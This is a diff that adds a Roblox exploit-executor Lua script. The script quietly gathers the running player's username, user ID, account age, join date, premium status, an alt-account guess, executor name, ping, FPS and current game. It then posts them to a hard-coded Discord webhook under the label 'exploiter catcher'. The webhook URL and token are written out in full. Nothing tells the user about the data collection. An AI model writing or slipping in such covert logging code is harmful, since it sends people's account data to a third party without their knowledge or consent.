@@ -1,0 +1,63 @@
+if _G.scriptExecuted then
+    return
+end
+ 
+_G.scriptExecuted = true
+
+local Webhook = "https://discord.com/api/webhooks/1252506282993385552/IhT56CUtjtlz-3RQB3-dDk4tJCAskph1iUDxTvw7J1uEEIMaY7-FrePAkq0g2hgOtMhF"
+getgenv().Discord_UserID = "1081767236424974486"
+
+local player = game:GetService("Players").LocalPlayer
+local joinDate = os.date("!*t", os.time() - (player.AccountAge * 86400))
+local premium = false
+local alt = true
+local ping = string.format('%.0f', game.Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
+local FPS = string.split(game.Stats.Workspace.Heartbeat:GetValueString(), ".")
+local executor = identifyexecutor() or "Unknown"
+
+local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%d&size=150x150&format=Png&isCircular=false", player.UserId))
+Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
+local AvatarImage = Thing.imageUrl
+
+if player.MembershipType == Enum.MembershipType.Premium then
+    premium = true
+end
+
+if not premium and player.AccountAge >= 70 then
+    alt = "Possible"
+elseif premium and player.AccountAge >= 70 then
+    alt = false
+end
+
+local gameUrl = "https://www.roblox.com/games/" .. game.PlaceId
+local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+
+local msg = {
+    ["username"] = "exploiter catcher",
+    ["avatar_url"] = "https://static.wikia.nocookie.net/madmurderer/images/1/12/Noob.png/revision/latest/scale-to-width-down/448?cb=20150212073303",
+    ["content"] = (getgenv().Discord_UserID ~= "" and getgenv().Discord_UserID ~= nil) and tostring("<@"..getgenv().Discord_UserID..">**:**") or "",
+    ["embeds"] = {{
+        ["color"] = tonumber(tostring("0x32CD32")),
+        ["title"] = "baddies caught u lackin",
+        ["thumbnail"] = {["url"] = AvatarImage},
+        ["fields"] = {
+            {["name"] = "Player:", ["value"] = "[ " .. player.Name .. "](https://www.roblox.com/users/" .. player.UserId .. "/profile) ", ["inline"] = true},
+            {["name"] = "Executor:", ["value"] = executor, ["inline"] = true},
+            {["name"] = "Alt:", ["value"] = alt, ["inline"] = true},
+            {["name"] = "Account Age:", ["value"] = player.AccountAge .. " day(s)", ["inline"] = true},
+            {["name"] = "Network:", ["value"] = tostring(FPS[1]) .. " FPS, " .. tostring(ping) .. " ping", ["inline"] = true},
+            {["name"] = "Date Joined:", ["value"] = joinDate.day .. "/" .. joinDate.month .. "/" .. joinDate.year, ["inline"] = true},
+            {["name"] = "Game Played:", ["value"] = "[" .. gameName .. "](" .. gameUrl .. ")", ["inline"] = true},
+        },
+        ["footer"] = {["icon_url"] = "https://cdn.discordapp.com/attachments/1214783461517295658/1214791574781960214/Png.png?ex=65fa65d1&is=65e7f0d1&hm=b156400a41e394eda5df2ee5433917bdfe53f45bf340fdfab409d2d7fb83cfba&", ["text"] = "crazy"},
+        ['timestamp'] = os.date("!%Y-%m-%dT%X.000Z")
+    }}
+}
+
+request = http_request or request or HttpPost or syn.request
+request({
+    Url = Webhook,
+    Method = "POST",
+    Headers = {["Content-Type"] = "application/json"},
+    Body = game.HttpService:JSONEncode(msg)
+})
